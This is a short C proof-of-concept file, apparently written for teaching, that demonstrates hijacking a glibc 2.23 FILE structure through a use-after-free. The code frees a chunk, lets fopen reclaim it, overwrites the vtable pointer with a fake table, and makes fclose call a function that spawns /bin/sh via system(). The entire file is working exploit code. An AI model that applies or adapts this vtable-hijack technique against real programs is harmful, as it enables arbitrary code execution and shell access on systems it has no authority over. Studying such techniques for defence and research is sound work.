/**
 * abusing the file structure (before patched, GLIBC 2.23)
 *
 * paulus.gandung@digitalsekuriti.id
 */

#include <stdio.h>
#include <stdlib.h>

static void yolo() { system("/bin/sh"); }
static void finish_callback(void) { exit(0x7a69); }

// _io_file_plus->file->vtable field..
static void *fake_vtable[] = {
	NULL,	// dummy
	NULL,	// dummy2
	finish_callback,	// finish
	NULL,	// overflow
	NULL,	// underflow
	NULL,	// uflow
	NULL,	// pbackfail
	NULL,	// xsputn
	NULL,	// xsgetn
	NULL,	// seekoff
	NULL,	// seekpos
	NULL,	// setbuf
	NULL,	// sync
	NULL,	// doallocate
	NULL,	// read
	NULL,	// write
	NULL,	// seek
	yolo,	// close
	NULL,	// stat
	NULL,	// showmanyc
	NULL,	// imbue
};

int main(void)
{
	FILE *fp;
	unsigned char *fake;

	fake = malloc(sizeof(FILE) + sizeof(void *));

	// put current allocated chunk into
	// corresponding bin..
	free(fake);

	// grab chunk from freed chunk above
	// as file handler structure..
	fp = fopen("/etc/passwd", "r");

	if (fp == NULL)
		return -1;

	// here fp = fake, because actual allocation
	// size of file structure while calling fopen()
	// is (sizeof(FILE) + sizeof(void *))

	printf("ptr: 0x%lx\n", *(size_t *)(fake + sizeof(FILE)));

	// overwrite vtable field (UAF)
	*((size_t *)(fake + sizeof(FILE))) = (size_t)fake_vtable;

	printf("ptr: 0x%lx\n", *(size_t *)(fake + sizeof(FILE)));
	printf("triggering \"yolo\" function..\n");

	// trigger..
	fclose(fp);

	return 0;
}
